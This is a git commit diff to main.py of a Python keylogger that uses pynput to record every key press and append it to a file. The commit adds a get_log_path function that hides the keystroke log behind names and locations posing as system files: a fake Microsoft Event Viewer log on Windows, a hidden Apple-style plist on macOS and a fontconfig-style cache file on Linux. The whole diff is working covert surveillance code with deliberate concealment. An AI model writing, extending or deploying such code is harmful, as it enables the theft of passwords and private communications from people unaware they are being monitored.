bb9f103d3c8828c2f3bda73eeaf299d94c882214
RykerWilder <fabiomasciarelliwd@gmail.com>
2026-01-09 17:46:57 +0100

    feat: get_log_path

--- main.py
+++ main.py
@@ -1,5 +1,6 @@
 from pynput.keyboard import Key, Listener
 import platform
+import os
 
 def on_press(key):
     """Handle key press events and log them to file."""
@@ -11,21 +12,23 @@ def on_press(key):
         key_data = str(key).replace("Key.", "")
         
     write_file(key_data)
-   
- 
-def write_file( key_data):
-    if platform.system() == "Windows":
-        with open('svchost.log', 'a') as f:
-            f.write(f"{key_data} ")
-                
-    elif platform.system() == "Darwin":
-        with open('.launchd.log', 'a') as f:
-            f.write(f"{key_data} ")
-                
-    elif platform.system() == "Linux":
-        with open('.systemd.dat', 'a') as f:
-            f.write(f"{key_data} ")
 
+def get_log_path():
+    system = platform.system()
+    
+    if system == "Windows":
+        return os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Event Viewer', 'ExternalLogs.dat')
+        
+    elif system == "Darwin":
+        return os.path.expanduser('~/Library/Caches/.com.apple.bird.plist')
+        
+    elif system == "Linux":
+        return os.path.expanduser('~/.cache/.fontconfig-timestamp.dat')
+
+def write_file(key_data):
+    log_file = get_log_path()
+    with open(log_file, 'a') as f:
+        f.write(f"{key_data} ")
 
 with Listener(on_press=on_press) as listener:
     listener.join()
